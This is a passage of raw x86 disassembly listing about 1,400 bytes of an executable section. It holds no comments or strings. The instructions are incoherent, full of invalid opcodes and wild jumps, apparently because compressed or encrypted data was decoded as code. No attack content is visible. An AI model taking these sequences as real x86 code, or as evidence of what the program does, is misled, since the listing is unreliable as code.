  406401:	22 7c 4f 57          	and    0x57(%edi,%ecx,2),%bh
  406405:	fe                   	(bad)
  406406:	7e 8f                	jle    0x406397
  406408:	f8                   	clc
  406409:	89 74 3c 16          	mov    %esi,0x16(%esp,%edi,1)
  40640d:	0e                   	push   %cs
  40640e:	57                   	push   %edi
  40640f:	07                   	pop    %es
  406410:	cf                   	iret
  406411:	2f                   	das
  406412:	b8 fe 12 01 09       	mov    $0x90112fe,%eax
  406417:	01 c2                	add    %eax,%edx
  406419:	fb                   	sti
  40641a:	f8                   	clc
  40641b:	c4 46 48             	les    0x48(%esi),%eax
  40641e:	da 59 ef             	ficompl -0x11(%ecx)
  406421:	c4                   	(bad)
  406422:	ef                   	out    %eax,(%dx)
  406423:	f8                   	clc
  406424:	04 3b                	add    $0x3b,%al
  406426:	60                   	pusha
  406427:	6b eb b9             	imul   $0xffffffb9,%ebx,%ebp
  40642a:	00 2b                	add    %ch,(%ebx)
  40642c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40642d:	7f 14                	jg     0x406443
  40642f:	f5                   	cmc
  406430:	30 5a bc             	xor    %bl,-0x44(%edx)
  406433:	2c 1e                	sub    $0x1e,%al
  406435:	39 d6                	cmp    %edx,%esi
  406437:	c4 41 dc             	les    -0x24(%ecx),%eax
  40643a:	33 3b                	xor    (%ebx),%edi
  40643c:	ce                   	into
  40643d:	5a                   	pop    %edx
  40643e:	c5 4e b5             	lds    -0x4b(%esi),%ecx
  406441:	ba b9 e6 5a 65       	mov    $0x655ae6b9,%edx
  406446:	bb 1c 37 6f 40       	mov    $0x406f371c,%ebx
  40644b:	e0 95                	loopne 0x4063e2
  40644d:	17                   	pop    %ss
  40644e:	b9 14 31 63 05       	mov    $0x5633114,%ecx
  406453:	86 6c 0c 5e          	xchg   %ch,0x5e(%esp,%ecx,1)
  406457:	1f                   	pop    %ds
  406458:	70 0e                	jo     0x406468
  40645a:	cd 53                	int    $0x53
  40645c:	b4 fe                	mov    $0xfe,%ah
  40645e:	90                   	nop
  40645f:	49                   	dec    %ecx
  406460:	1c ca                	sbb    $0xca,%al
  406462:	0a 40 77             	or     0x77(%eax),%al
  406465:	1a c8                	sbb    %al,%cl
  406467:	00 8c 01 40 a9 e7 85 	add    %cl,-0x7a1856c0(%ecx,%eax,1)
  40646e:	1b a0 d4 3b 7f 0d    	sbb    0xd7f3bd4(%eax),%esp
  406474:	a8 fc                	test   $0xfc,%al
  406476:	68 d5 3f 06 24       	push   $0x24063fd5
  40647b:	80 61 5d 4b          	andb   $0x4b,0x5d(%ecx)
  40647f:	14 27                	adc    $0x27,%al
  406481:	4c                   	dec    %esp
  406482:	60                   	pusha
  406483:	04 b7                	add    $0xb7,%al
  406485:	1b 44 0d 92          	sbb    -0x6e(%ebp,%ecx,1),%eax
  406489:	8c 26                	mov    %fs,(%esi)
  40648b:	3c 2c                	cmp    $0x2c,%al
  40648d:	74 5a                	je     0x4064e9
  40648f:	74 0d                	je     0x40649e
  406491:	11 73 a7             	adc    %esi,-0x59(%ebx)
  406494:	43                   	inc    %ebx
  406495:	18 3b                	sbb    %bh,(%ebx)
  406497:	90                   	nop
  406498:	e2 d1                	loop   0x40646b
  40649a:	06                   	push   %es
  40649b:	f3 ff a0 ec 5a 50 e5 	repz jmp *-0x1aafa514(%eax)
  4064a2:	7a 07                	jp     0x4064ab
  4064a4:	1c c5                	sbb    $0xc5,%al
  4064a6:	be 3e 8e 5e 85       	mov    $0x855e8e3e,%esi
  4064ab:	9e                   	sahf
  4064ac:	89 18                	mov    %ebx,(%eax)
  4064ae:	22 10                	and    (%eax),%dl
  4064b0:	93                   	xchg   %eax,%ebx
  4064b1:	80 2f 28             	subb   $0x28,(%edi)
  4064b4:	6b 54 09 0d 19       	imul   $0x19,0xd(%ecx,%ecx,1),%edx
  4064b9:	5c                   	pop    %esp
  4064ba:	aa                   	stos   %al,%es:(%edi)
  4064bb:	38 b7 25 1b 97 62    	cmp    %dh,0x62971b25(%edi)
  4064c1:	14 11                	adc    $0x11,%al
  4064c3:	ca c6 16             	lret   $0x16c6
  4064c6:	9f                   	lahf
  4064c7:	80 00 10             	addb   $0x10,(%eax)
  4064ca:	ee                   	out    %al,(%dx)
  4064cb:	44                   	inc    %esp
  4064cc:	8f                   	(bad)
  4064cd:	5f                   	pop    %edi
  4064ce:	a2 b0 f4 2c 02       	mov    %al,0x22cf4b0
  4064d3:	23 70 16             	and    0x16(%eax),%esi
  4064d6:	12 60 55             	adc    0x55(%eax),%ah
  4064d9:	33 91 b0 c2 01 db    	xor    -0x24fe3d50(%ecx),%edx
  4064df:	27                   	daa
  4064e0:	67 51                	addr16 push %ecx
  4064e2:	12 c9                	adc    %cl,%cl
  4064e4:	51                   	push   %ecx
  4064e5:	a0 2c ff 17 09       	mov    0x917ff2c,%al
  4064ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4064eb:	21 53 74             	and    %edx,0x74(%ebx)
  4064ee:	b5 f9                	mov    $0xf9,%ch
  4064f0:	53                   	push   %ebx
  4064f1:	08 13                	or     %dl,(%ebx)
  4064f3:	92                   	xchg   %eax,%edx
  4064f4:	f6 59 aa             	negb   -0x56(%ecx)
  4064f7:	b3 60                	mov    $0x60,%bl
  4064f9:	96                   	xchg   %eax,%esi
  4064fa:	c9                   	leave
  4064fb:	6a 53                	push   $0x53
  4064fd:	00 5d 68             	add    %bl,0x68(%ebp)
  406500:	6b 6c fc 90 fc       	imul   $0xfffffffc,-0x70(%esp,%edi,8),%ebp
  406505:	83 32 50             	xorl   $0x50,(%edx)
  406508:	37                   	aaa
  406509:	14 75                	adc    $0x75,%al
  40650b:	fb                   	sti
  40650c:	12 e7                	adc    %bh,%ah
  40650e:	a8 9d                	test   $0x9d,%al
  406510:	7c e6                	jl     0x4064f8
  406512:	0a 0b                	or     (%ebx),%cl
  406514:	26 e9 07 79 0b 44    	es jmp 0x444bde21
  40651a:	ef                   	out    %eax,(%dx)
  40651b:	05 3e ba 0c 60       	add    $0x600cba3e,%eax
  406520:	23 bc fe 9d 15 48 93 	and    -0x6cb7ea63(%esi,%edi,8),%edi
  406527:	3b 32                	cmp    (%edx),%esi
  406529:	04 d6                	add    $0xd6,%al
  40652b:	81 c8 73 1c a6 70    	or     $0x70a61c73,%eax
  406531:	94                   	xchg   %eax,%esp
  406532:	04 42                	add    $0x42,%al
  406534:	69 c7 9e 4a 08 63    	imul   $0x63084a9e,%edi,%eax
  40653a:	31 3c 5f             	xor    %edi,(%edi,%ebx,2)
  40653d:	1e                   	push   %ds
  40653e:	ad                   	lods   %ds:(%esi),%eax
  40653f:	eb f4                	jmp    0x406535
  406541:	83 3f f1             	cmpl   $0xfffffff1,(%edi)
  406544:	e1 97                	loope  0x4064dd
  406546:	cd 24                	int    $0x24
  406548:	4f                   	dec    %edi
  406549:	eb a3                	jmp    0x4064ee
  40654b:	6d                   	insl   (%dx),%es:(%edi)
  40654c:	29 1a                	sub    %ebx,(%edx)
  40654e:	d9 0c 81             	(bad) (%ecx,%eax,4)
  406551:	4e                   	dec    %esi
  406552:	8b 0e                	mov    (%esi),%ecx
  406554:	a8 6b                	test   $0x6b,%al
  406556:	85 0a                	test   %ecx,(%edx)
  406558:	10 f7                	adc    %dh,%bh
  40655a:	88 7d fd             	mov    %bh,-0x3(%ebp)
  40655d:	c0 1c da d3          	rcrb   $0xd3,(%edx,%ebx,8)
  406561:	98                   	cwtl
  406562:	50                   	push   %eax
  406563:	d4 3a                	aam    $0x3a
  406565:	a9 38 08 3d 4a       	test   $0x4a3d0838,%eax
  40656a:	ad                   	lods   %ds:(%esi),%eax
  40656b:	a3 f1 b5 22 d1       	mov    %eax,0xd122b5f1
  406570:	14 00                	adc    $0x0,%al
  406572:	cd a2                	int    $0xa2
  406574:	72 11                	jb     0x406587
  406576:	10 c6                	adc    %al,%dh
  406578:	76 8f                	jbe    0x406509
  40657a:	61                   	popa
  40657b:	78 0b                	js     0x406588
  40657d:	01 7f 32             	add    %edi,0x32(%edi)
  406580:	9d                   	popf
  406581:	5f                   	pop    %edi
  406582:	d2 fe                	sar    %cl,%dh
  406584:	91                   	xchg   %eax,%ecx
  406585:	12 77 08             	adc    0x8(%edi),%dh
  406588:	a9 71 00 b2 b1       	test   $0xb1b20071,%eax
  40658d:	f2 56                	repnz push %esi
  40658f:	80 15 35 66 cc 00 f4 	adcb   $0xf4,0xcc6635
  406596:	e3 78                	jecxz  0x406610
  406598:	aa                   	stos   %al,%es:(%edi)
  406599:	1d 50 51 20 71       	sbb    $0x71205150,%eax
  40659e:	7e 0e                	jle    0x4065ae
  4065a0:	2a da                	sub    %dl,%bl
  4065a2:	34 24                	xor    $0x24,%al
  4065a4:	ec                   	in     (%dx),%al
  4065a5:	66 00 da             	data16 add %bl,%dl
  4065a8:	60                   	pusha
  4065a9:	26 62 83 ec 8f 04 0c 	bound  %eax,%es:0xc048fec(%ebx)
  4065b0:	37                   	aaa
  4065b1:	8e 8e 9a 18 0c 80    	mov    -0x7ff3e766(%esi),%cs
  4065b7:	e9 39 44 e1 69       	jmp    0x6a21a9f5
  4065bc:	ec                   	in     (%dx),%al
  4065bd:	44                   	inc    %esp
  4065be:	53                   	push   %ebx
  4065bf:	1b 61 0b             	sbb    0xb(%ecx),%esp
  4065c2:	cd 0d                	int    $0xd
  4065c4:	88 10                	mov    %dl,(%eax)
  4065c6:	b1 e5                	mov    $0xe5,%cl
  4065c8:	e7 15                	out    %eax,$0x15
  4065ca:	18 98 0c a0 99 38    	sbb    %bl,0x3899a00c(%eax)
  4065d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4065d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4065d2:	b6 ea                	mov    $0xea,%dh
  4065d4:	f3 80 02 eb          	repz addb $0xeb,(%edx)
  4065d8:	d7                   	xlat   %ds:(%ebx)
  4065d9:	d9 e5                	fxam
  4065db:	22 6e 04             	and    0x4(%esi),%ch
  4065de:	04 39                	add    $0x39,%al
  4065e0:	cb                   	lret
  4065e1:	d3 ba 00 e1 58 1e    	sarl   %cl,0x1e58e100(%edx)
  4065e7:	6d                   	insl   (%dx),%es:(%edi)
  4065e8:	e0 01                	loopne 0x4065eb
  4065ea:	c4 29                	les    (%ecx),%ebp
  4065ec:	e2 b5                	loop   0x4065a3
  4065ee:	9a 84 71 64 33 34 04 	lcall  $0x434,$0x33647184
  4065f5:	7c fe                	jl     0x4065f5
  4065f7:	86 76 86             	xchg   %dh,-0x7a(%esi)
  4065fa:	86 27                	xchg   %ah,(%edi)
  4065fc:	27                   	daa
  4065fd:	34 94                	xor    $0x94,%al
  4065ff:	14 8d                	adc    $0x8d,%al
  406601:	40                   	inc    %eax
  406602:	e1 00                	loope  0x406604
  406604:	4e                   	dec    %esi
  406605:	54                   	push   %esp
  406606:	86 b0 10 b8 1b e2    	xchg   %dh,-0x1de447f0(%eax)
  40660c:	e3 94                	jecxz  0x4065a2
  40660e:	b3 70                	mov    $0x70,%bl
  406610:	4a                   	dec    %edx
  406611:	e4 65                	in     $0x65,%al
  406613:	cd 81                	int    $0x81
  406615:	47                   	inc    %edi
  406616:	f0 70 b3             	lock jo 0x4065cc
  406619:	3c 8c                	cmp    $0x8c,%al
  40661b:	e5 ec                	in     $0xec,%eax
  40661d:	e8 02 c3 58 7c       	call   0x7c992924
  406622:	1c e7                	sbb    $0xe7,%al
  406624:	23 6d e4             	and    -0x1c(%ebp),%ebp
  406627:	e0 e7                	loopne 0x406610
  406629:	72 1c                	jb     0x406647
  40662b:	37                   	aaa
  40662c:	cb                   	lret
  40662d:	dc d8                	(bad)
  40662f:	e8 cd 64 a3 38       	call   0x38e3cb01
  406634:	0a e9                	or     %cl,%ch
  406636:	32 86 05 59 a8 86    	xor    -0x7957a6fb(%esi),%al
  40663c:	c9                   	leave
  40663d:	8f                   	(bad)
  40663e:	7f 47                	jg     0x406687
  406640:	3d ef b9 73 19       	cmp    $0x1973b9ef,%eax
  406645:	f0 94                	lock xchg %eax,%esp
  406647:	09 cd                	or     %ecx,%ebp
  406649:	b1 91                	mov    $0x91,%cl
  40664b:	14 47                	adc    $0x47,%al
  40664d:	51                   	push   %ecx
  40664e:	3a ed                	cmp    %ch,%ch
  406650:	48                   	dec    %eax
  406651:	fc                   	cld
  406652:	8c 34 f2             	mov    %?,(%edx,%esi,8)
  406655:	76 e6                	jbe    0x40663d
  406657:	5e                   	pop    %esi
  406658:	87 18                	xchg   %ebx,(%eax)
  40665a:	b4 00                	mov    $0x0,%ah
  40665c:	84 30                	test   %dh,(%eax)
  40665e:	20 71 33             	and    %dh,0x33(%ecx)
  406661:	11 e5                	adc    %esp,%ebp
  406663:	3f                   	aas
  406664:	a2 d4 f0 cf f3       	mov    %al,0xf3cff0d4
  406669:	3c 87                	cmp    $0x87,%al
  40666b:	ec                   	in     (%dx),%al
  40666c:	e8 e4 e0 b4 8c       	call   0x8cf54755
  406671:	f6 3c dc             	idivb  (%esp,%ebx,8)
  406674:	d8 e4                	fsub   %st(4),%st
  406676:	db 73 58             	(bad) 0x58(%ebx)
  406679:	0c 04                	or     $0x4,%al
  40667b:	29 7b 1d             	sub    %edi,0x1d(%ebx)
  40667e:	a0 14 e1 35 f5       	mov    0xf535e114,%al
  406683:	0d 5c d7 c8 63       	or     $0x63c8d75c,%eax
  406688:	0c 1c                	or     $0x1c,%al
  40668a:	97                   	xchg   %eax,%edi
  40668b:	d2 b1 50 ee 83 20    	shlb   %cl,0x2083ee50(%ecx)
  406691:	e7 58                	out    %eax,$0x58
  406693:	6e                   	outsb  %ds:(%esi),(%dx)
  406694:	38 a9 fe 37 0a 83    	cmp    %ch,-0x7cf5c802(%ecx)
  40669a:	59                   	pop    %ecx
  40669b:	9a 0d c5 a2 6c 71 4c 	lcall  $0x4c71,$0x6ca2c50d
  4066a2:	08 e3                	or     %ah,%bl
  4066a4:	22 fd                	and    %ch,%bh
  4066a6:	1c 61                	sbb    $0x61,%al
  4066a8:	3a 26                	cmp    (%esi),%ah
  4066aa:	65 35 18 0e 0c 2c    	gs xor $0x2c0c0e18,%eax
  4066b0:	5b                   	pop    %ebx
  4066b1:	44                   	inc    %esp
  4066b2:	8e 3a                	mov    (%edx),%?
  4066b4:	8b 81 a4 16 1c ff    	mov    -0xe3e95c(%ecx),%eax
  4066ba:	0f dc 78 a3          	paddusb -0x5d(%eax),%mm7
  4066be:	35 8e 00 0a 45       	xor    $0x450a008e,%eax
  4066c3:	96                   	xchg   %eax,%esi
  4066c4:	8b 88 dc 65 15 ad    	mov    -0x52ea9a24(%eax),%ecx
  4066ca:	59                   	pop    %ecx
  4066cb:	14 18                	adc    $0x18,%al
  4066cd:	65 ac                	lods   %gs:(%esi),%al
  4066cf:	0b 10                	or     (%eax),%edx
  4066d1:	66 13 cc             	adc    %sp,%cx
  4066d4:	7b 03                	jnp    0x4066d9
  4066d6:	c6                   	(bad)
  4066d7:	19 85 e3 1c 95 38    	sbb    %eax,0x38951ce3(%ebp)
  4066dd:	87 ab 16 d4 fe 1e    	xchg   %ebp,0x1efed416(%ebx)
  4066e3:	a8 16                	test   $0x16,%al
  4066e5:	66 ad                	lods   %ds:(%esi),%ax
  4066e7:	01 0a                	add    %ecx,(%edx)
  4066e9:	11 43 1c             	adc    %eax,0x1c(%ebx)
  4066ec:	96                   	xchg   %eax,%esi
  4066ed:	4a                   	dec    %edx
  4066ee:	3c 01                	cmp    $0x1,%al
  4066f0:	4c                   	dec    %esp
  4066f1:	0a 30                	or     (%eax),%dh
  4066f3:	e4 be                	in     $0xbe,%al
  4066f5:	fc                   	cld
  4066f6:	cb                   	lret
  4066f7:	fe                   	(bad)
  4066f8:	64 cc                	fs int3
  4066fa:	fe                   	(bad)
  4066fb:	e7 93                	out    %eax,$0x93
  4066fd:	96                   	xchg   %eax,%esi
  4066fe:	fa                   	cli
  4066ff:	08 6c 54 ce          	or     %ch,-0x32(%esp,%edx,2)
  406703:	86 21                	xchg   %ah,(%ecx)
  406705:	9e                   	sahf
  406706:	12 79 92             	adc    -0x6e(%ecx),%bh
  406709:	9b                   	fwait
  40670a:	ac                   	lods   %ds:(%esi),%al
  40670b:	27                   	daa
  40670c:	3a be e5 66 c7 94    	cmp    -0x6b38991b(%esi),%bh
  406712:	ea 7c 77 92 7b 68 ce 	ljmp   $0xce68,$0x7b92777c
  406719:	dc f5                	fdiv   %st,%st(5)
  40671b:	da 27                	fisubl (%edi)
  40671d:	e8 dc 4a aa f5       	call   0xf5eab1fe
  406722:	42                   	inc    %edx
  406723:	6a 9f                	push   $0xffffff9f
  406725:	70 56                	jo     0x40677d
  406727:	08 5a 12             	or     %bl,0x12(%edx)
  40672a:	6e                   	outsb  %ds:(%esi),(%dx)
  40672b:	51                   	push   %ecx
  40672c:	b5 f1                	mov    $0xf1,%ch
  40672e:	58                   	pop    %eax
  40672f:	ec                   	in     (%dx),%al
  406730:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406731:	01 5e 14             	add    %ebx,0x14(%esi)
  406734:	2c 7c                	sub    $0x7c,%al
  406736:	2f                   	das
  406737:	5c                   	pop    %esp
  406738:	71 58                	jno    0x406792
  40673a:	71 60                	jno    0x40679c
  40673c:	64 0b 73 7c          	or     %fs:0x7c(%ebx),%esi
  406740:	04 50                	add    $0x50,%al
  406742:	3a a6 20 0a 15 02    	cmp    0x2150a20(%esi),%ah
  406748:	b9 6c 0e 34 6c       	mov    $0x6c340e6c,%ecx
  40674d:	5b                   	pop    %ebx
  40674e:	9e                   	sahf
  40674f:	5e                   	pop    %esi
  406750:	74 aa                	je     0x4066fc
  406752:	17                   	pop    %ss
  406753:	25 36 9d 74 4e       	and    $0x4e749d36,%eax
  406758:	aa                   	stos   %al,%es:(%edi)
  406759:	d9 fd                	fscale
  40675b:	97                   	xchg   %eax,%edi
  40675c:	16                   	push   %ss
  40675d:	59                   	pop    %ecx
  40675e:	ec                   	in     (%dx),%al
  40675f:	3c 97                	cmp    $0x97,%al
  406761:	d3 27                	shll   %cl,(%edi)
  406763:	b3 17                	mov    $0x17,%bl
  406765:	0c 7c                	or     $0x7c,%al
  406767:	41                   	inc    %ecx
  406768:	a3 7a 11 1a 2c       	mov    %eax,0x2c1a117a
  40676d:	2d 15 3d 3d 29       	sub    $0x293d3d15,%eax
  406772:	04 cb                	add    $0xcb,%al
  406774:	96                   	xchg   %eax,%esi
  406775:	b0 01                	mov    $0x1,%al
  406777:	30 e6                	xor    %ah,%dh
  406779:	29 b6 c7 82 d1 35    	sub    %esi,0x35d182c7(%esi)
  40677f:	f6 50 eb             	notb   -0x15(%eax)
  406782:	44                   	inc    %esp
  406783:	d2 30                	shlb   %cl,(%eax)
  406785:	fb                   	sti
  406786:	17                   	pop    %ss
  406787:	e4 d9                	in     $0xd9,%al
  406789:	d8 3c 93             	fdivrs (%ebx,%edx,4)
  40678c:	3c 2c                	cmp    $0x2c,%al
  40678e:	8c ec                	mov    %gs,%esp
  406790:	f0 20 48 ed          	lock and %cl,-0x13(%eax)
  406794:	76 20                	jbe    0x4067b6
  406796:	4b                   	dec    %ebx
  406797:	8c 34 fd 28 0a 7e 16 	mov    %?,0x167e0a28(,%edi,8)
  40679e:	61                   	popa
  40679f:	fd                   	std
  4067a0:	59                   	pop    %ecx
  4067a1:	2c fd                	sub    $0xfd,%al
  4067a3:	1f                   	pop    %ds
  4067a4:	14 91                	adc    $0x91,%al
  4067a6:	2b 5e 0c             	sub    0xc(%esi),%ebx
  4067a9:	27                   	daa
  4067aa:	db 70 71             	(bad) 0x71(%eax)
  4067ad:	28 fd                	sub    %bh,%ch
  4067af:	89 b8 d0 2d 71 44    	mov    %edi,0x44712dd0(%eax)
  4067b5:	29 04 42             	sub    %eax,(%edx,%eax,2)
  4067b8:	e7 10                	out    %eax,$0x10
  4067ba:	f0 fc                	lock cld
  4067bc:	1f                   	pop    %ds
  4067bd:	fc                   	cld
  4067be:	6c                   	insb   (%dx),%es:(%edi)
  4067bf:	7d 13                	jge    0x4067d4
  4067c1:	29 d0                	sub    %edx,%eax
  4067c3:	bb ce 82 bd 3c       	mov    $0x3cbd82ce,%ebx
  4067c8:	60                   	pusha
  4067c9:	16                   	push   %ss
  4067ca:	d7                   	xlat   %ds:(%ebx)
  4067cb:	52                   	push   %edx
  4067cc:	20 6c 71 1b          	and    %ch,0x1b(%ecx,%esi,2)
  4067d0:	62 09                	bound  %ecx,(%ecx)
  4067d2:	4d                   	dec    %ebp
  4067d3:	48                   	dec    %eax
  4067d4:	6c                   	insb   (%dx),%es:(%edi)
  4067d5:	20 03                	and    %al,(%ebx)
  4067d7:	5a                   	pop    %edx
  4067d8:	2a 50 36             	sub    0x36(%eax),%dl
  4067db:	af                   	scas   %es:(%edi),%eax
  4067dc:	0a e0                	or     %al,%ah
  4067de:	6d                   	insl   (%dx),%es:(%edi)
  4067df:	fd                   	std
  4067e0:	33 04 01             	xor    (%ecx,%eax,1),%eax
  4067e3:	46                   	inc    %esi
  4067e4:	e0 fb                	loopne 0x4067e1
  4067e6:	e3 e6                	jecxz  0x4067ce
  4067e8:	0b 86 f0 fb 0a 03    	or     0x30afbf0(%esi),%eax
  4067ee:	1c 8b                	sbb    $0x8b,%al
  4067f0:	fc                   	cld
  4067f1:	9c                   	pushf
  4067f2:	a2 0b 2c 03 d0       	mov    %al,0xd0032c0b
  4067f7:	fb                   	sti
  4067f8:	55                   	push   %ebp
  4067f9:	70 32                	jo     0x40682d
  4067fb:	fd                   	std
  4067fc:	13 61 ce             	adc    -0x32(%ecx),%esp
  4067ff:	78 3a                	js     0x40683b
  406801:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406802:	59                   	pop    %ecx
  406803:	30 6b 92             	xor    %ch,-0x6e(%ebx)
  406806:	c1 f7 82             	shl    $0x82,%edi
  406809:	ad                   	lods   %ds:(%esi),%eax
  40680a:	e7 23                	out    %eax,$0x23
  40680c:	cc                   	int3
  40680d:	fb                   	sti
  40680e:	a3 2c 8c 1d c8       	mov    %eax,0xc81d8c2c
  406813:	fb                   	sti
  406814:	6c                   	insb   (%dx),%es:(%edi)
  406815:	26 73 38             	es jae 0x406850
  406818:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406819:	47                   	inc    %edi
  40681a:	6c                   	insb   (%dx),%es:(%edi)
  40681b:	c8 97 1b 09          	enter  $0x1b97,$0x9
  40681f:	72 31                	jb     0x406852
  406821:	40                   	inc    %eax
  406822:	fd                   	std
  406823:	ea 04 e7 54 00 42 ca 	ljmp   $0xca42,$0x54e704
  40682a:	25 80 ce 4d b8       	and    $0xb84dce80,%eax
  40682f:	fb                   	sti
  406830:	8e f9                	mov    %ecx,%?
  406832:	88 5c 06 fa          	mov    %bl,-0x6(%esi,%eax,1)
  406836:	d7                   	xlat   %ds:(%ebx)
  406837:	d6                   	salc
  406838:	4b                   	dec    %ebx
  406839:	af                   	scas   %es:(%edi),%eax
  40683a:	0a 7a 97             	or     -0x69(%edx),%bh
  40683d:	28 a8 fb 51 9d f1    	sub    %ch,-0xe62ae05(%eax)
  406843:	26 f0 95             	es lock xchg %eax,%ebp
  406846:	fd                   	std
  406847:	e6 3c                	out    %al,$0x3c
  406849:	1c 07                	sbb    $0x7,%al
  40684b:	57                   	push   %edi
  40684c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40684d:	d9 f2                	fptan
  40684f:	3a bc 8e 90 02 70 fa 	cmp    -0x58ffd70(%esi,%ecx,4),%bh
  406856:	8e d6                	mov    %esi,%ss
  406858:	4d                   	dec    %ebp
  406859:	71 07                	jno    0x406862
  40685b:	7b dd                	jnp    0x40683a
  40685d:	38 a7 19 2e 92 09    	cmp    %ah,0x9922e19(%edi)
  406863:	05 1e 5f 0b 0a       	add    $0xa0b5f1e,%eax
  406868:	33 ed                	xor    %ebp,%ebp
  40686a:	2c 3b                	sub    $0x3b,%al
  40686c:	23 4a ac             	and    -0x54(%edx),%ecx
  40686f:	4d                   	dec    %ebp
  406870:	40                   	inc    %eax
  406871:	fb                   	sti
  406872:	90                   	nop
  406873:	25 22 0c 05 68       	and    $0x68050c22,%eax
  406878:	01 d6                	add    %edx,%esi
  40687a:	b1 92                	mov    $0x92,%cl
  40687c:	7d 80                	jge    0x4067fe
  40687e:	68 07 81 1c 80       	push   $0x801c8107
  406883:	49                   	dec    %ecx
  406884:	30 50 84             	xor    %dl,-0x7c(%eax)
  406887:	59                   	pop    %ecx
  406888:	39 f8                	cmp    %edi,%eax
  40688a:	0f e1 34 78          	psraw  (%eax,%edi,2),%mm6
  40688e:	65 11 7e 00          	adc    %edi,%gs:0x0(%esi)
  406892:	e9 32 22 9c 02       	jmp    0x2dc8ac9
  406897:	6c                   	insb   (%dx),%es:(%edi)
  406898:	47                   	inc    %edi
  406899:	5d                   	pop    %ebp
  40689a:	b4 f5                	mov    $0xf5,%ah
  40689c:	62 02                	bound  %eax,(%edx)
  40689e:	3e f0 a7             	lock cmpsl %es:(%edi),%ds:(%esi)
  4068a1:	27                   	daa
  4068a2:	00 62 02             	add    %ah,0x2(%edx)
  4068a5:	6a 60                	push   $0x60
  4068a7:	d8 a0 0c ba 02 49    	fsubs  0x4902ba0c(%eax)
  4068ad:	20 b6 81 9e fb bd    	and    %dh,-0x4204617f(%esi)
  4068b3:	21 00                	and    %eax,(%eax)
  4068b5:	c6 02 19             	movb   $0x19,(%edx)
  4068b8:	ab                   	stos   %eax,%es:(%edi)
  4068b9:	89 7e b6             	mov    %edi,-0x4a(%esi)
  4068bc:	2e 63 c6             	cs arpl %eax,%esi
  4068bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4068c0:	0b 86 01 20 24 5a    	or     0x5a242001(%esi),%eax
  4068c6:	c6                   	(bad)
  4068c7:	91                   	xchg   %eax,%ecx
  4068c8:	5e                   	pop    %esi
  4068c9:	60                   	pusha
  4068ca:	b7 c3                	mov    $0xc3,%bh
  4068cc:	42                   	inc    %edx
  4068cd:	c8 02 3c 86          	enter  $0x3c02,$0x86
  4068d1:	2b 8f d0 98 e3 87    	sub    -0x781c6730(%edi),%ecx
  4068d7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4068d8:	f6 08 8e             	testb  $0x8e,(%eax)
  4068db:	ea ec b3 09 78 78 41 	ljmp   $0x4178,$0x7809b3ec
  4068e2:	b3 e3                	mov    $0xe3,%bl
  4068e4:	ce                   	into
  4068e5:	0a 7c 3d 67          	or     0x67(%ebp,%edi,1),%bh
  4068e9:	09 9d b8 06 65 e2    	or     %ebx,-0x1d9af948(%ebp)
  4068ef:	37                   	aaa
  4068f0:	95                   	xchg   %eax,%ebp
  4068f1:	09 40 c4             	or     %eax,-0x3c(%eax)
  4068f4:	5c                   	pop    %esp
  4068f5:	e4 23                	in     $0x23,%al
  4068f7:	04 39                	add    $0x39,%al
  4068f9:	ce                   	into
  4068fa:	fb                   	sti
  4068fb:	88 5f 40             	mov    %bl,0x40(%edi)
  4068fe:	68 8b 38 d2 94       	push   $0x94d2388b
  406903:	e2 ac                	loop   0x4068b1
  406905:	80 38 45             	cmpb   $0x45,(%eax)
  406908:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406909:	b6 68                	mov    $0x68,%dh
  40690b:	67 3f                	addr16 aas
  40690d:	23 19                	and    (%ecx),%ebx
  40690f:	c2 04 34             	ret    $0x3404
  406912:	48                   	dec    %eax
  406913:	b0 c5                	mov    $0xc5,%al
  406915:	47                   	inc    %edi
  406916:	34 6c                	xor    $0x6c,%al
  406918:	a1 c5 c4 8c c5       	mov    0xc58cc4c5,%eax
  40691d:	85 32                	test   %esi,(%edx)
  40691f:	64 30 f1             	fs xor %dh,%cl
  406922:	be 8b b2 30 ce       	mov    $0xce30b28b,%esi
  406927:	54                   	push   %esp
  406928:	82 5d e6 26          	sbbb   $0x26,-0x1a(%ebp)
  40692c:	cd 45                	int    $0x45
  40692e:	11 20                	adc    %esp,(%eax)
  406930:	89 ec                	mov    %ebp,%esp
  406932:	bc 24 84 c1 8e       	mov    $0x8ec18424,%esp
  406937:	76 9f                	jbe    0x4068d8
  406939:	b3 98                	mov    $0x98,%bl
  40693b:	13 d3                	adc    %ebx,%edx
  40693d:	29 20                	sub    %esp,(%eax)
  40693f:	83 69 8f a5          	subl   $0xffffffa5,-0x71(%ecx)
  406943:	0e                   	push   %cs
  406944:	8f 8a 14 5a          	(bad)
  406948:	86 0f                	xchg   %cl,(%edi)
  40694a:	3b 8c 05 44 9f 7d 1c 	cmp    0x1c7d9f44(%ebp,%eax,1),%ecx
  406951:	43                   	inc    %ebx
  406952:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406953:	14 02                	adc    $0x2,%al
  406955:	95                   	xchg   %eax,%ebp
  406956:	6d                   	insl   (%dx),%es:(%edi)
  406957:	96                   	xchg   %eax,%esi
  406958:	a1 db 2c 08 ba       	mov    0xba082cdb,%eax
  40695d:	24 0b                	and    $0xb,%al
  40695f:	16                   	push   %ss
  406960:	5b                   	pop    %ebx
  406961:	7e 97                	jle    0x4068fa
  406963:	62 2c 39             	bound  %ebp,(%ecx,%edi,1)
  406966:	6e                   	outsb  %ds:(%esi),(%dx)
  406967:	e1 f5                	loope  0x40695e
  406969:	04 a4                	add    $0xa4,%al
  40696b:	af                   	scas   %es:(%edi),%eax
  40696c:	3c d9                	cmp    $0xd9,%al
  40696e:	38 17                	cmp    %dl,(%edi)
  406970:	e2 ec                	loop   0x40695e
  406972:	62 e2 05 18 06       	(bad)
  406977:	36 a8 d9             	ss test $0xd9,%al
  40697a:	d0 19                	rcrb   $1,(%ecx)
  40697c:	3e ce                	ds into
  40697e:	86 4e 1a             	xchg   %cl,0x1a(%esi)
  406981:	08 56 d8             	or     %dl,-0x28(%esi)
